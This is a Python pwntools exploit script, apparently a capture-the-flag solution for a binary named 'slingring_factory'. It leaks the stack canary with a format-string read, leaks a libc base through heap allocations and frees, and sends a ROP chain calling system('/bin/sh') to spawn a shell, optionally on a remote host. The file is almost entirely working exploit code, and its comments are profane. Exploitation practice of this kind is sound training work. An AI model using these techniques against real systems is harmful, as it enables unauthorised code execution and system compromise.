from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./slingring_factory_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+173
    b *use_slingring+196
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def extracting_canary():
    pp.recvuntil(b"?\n")
    pp.sendline(b"%7$p")
    canary = int(pp.recvline().replace(b"Hello, ", b"").rstrip(), 16)
    log.info(f"fucking canary {hex(canary)}")


    return (canary)


def alloc(place, nor):
    pp.recvuntil(b">> ")
    pp.sendline(b"2")
    # pp.recvuntil(b"!\n")
    pp.sendline(str(place).encode())
    # pp.recvuntil(b":\n")
    pp.sendline(str(place).encode())
    # pp.recvuntil(b":\n")
    pp.sendline(str(nor).encode())
    # pp.recvuntil(b"return.\n")
    pp.sendline(b"")

def free(place):
    # pp.recvuntil(b">> ")
    pp.sendline(b"3")
    # pp.recvuntil(b"?\n")
    pp.sendline(str(place).encode())

def pad (i):
    i = i.rstrip()
    padded = u64(i + ((8 - len(i)) * b"\x00"))
    return (padded)

def show_chunk(i):
    pp.recvuntil(b">> ")
    pp.sendline(b"1")
    pp.recvuntil(b"]\n")
    for p in range(9):
        x = pp.recvline().split(b"|")
        padded = pad(x[-1][1:-1])
        if (p == i):
            # pp.recvuntil(b"return.\n")
            pp.sendline(b"")
            return (padded)
    pp.recvuntil(b"return.\n")
    pp.sendline(b"")



def show():
    pp.recvuntil(b">> ")
    pp.sendline(b"1")
    pp.recvuntil(b"]\n")
    for i in range(9):
        x = pp.recvline().split(b"|")
        padded = pad(x[-1][1:-1])
        print(f"leaked shit {hex(padded)}")
    pp.recvuntil(b"return.\n")
    pp.sendline(b"")

def exploit():
    canary = extracting_canary()
    for i in range(9):
        log.info(f"allocing {i}")
        alloc(i, 9)
    for i in range(9):
        log.info(f"freeing {i}")
        free(i) 
    show()
    libc.base = show_chunk(7) - 2206944
    log.info(f"lib base = {libc.base}")

    log.info("assembling the rops")
    binsh = next(libc.search(b"/bin/sh\x00")) + libc.base
    pop_rdi = libcrops.rdi.address + libc.base
    ret = pop_rdi + 1 
    print(hex(pop_rdi))
    payload = flat(
        cyclic(56),
        canary,
        0,
        pop_rdi,
        binsh,
        ret,
        libc.sym.system + libc.base,
    )
    log.info("fucking sending it")
    pp.recvuntil(b">> ")
    pp.sendline(b"4")
    pp.recvuntil(b": ")
    pp.sendline(b"0")
    pp.recvuntil(b": ")
    pp.sendline(payload)
    pp.interactive()


def fuzz(i):
    #offset = 
    pp.recvuntil(b"?\n")
    pp.sendline(f"%{i}$p".encode())
    # elf.address = int(pp.recvline().replace(b"Hello, ", b"").rstrip(), 16) - 3432
    leak = pp.recvline().replace(b"Hello, ", b"").rstrip()
    print(f"fucking leak :{leak} {i}")
    pp.recvuntil(b">>")
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("./libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
# for i in range(40):
#     pp = init()
#     fuzz(i)
#     pp.close()

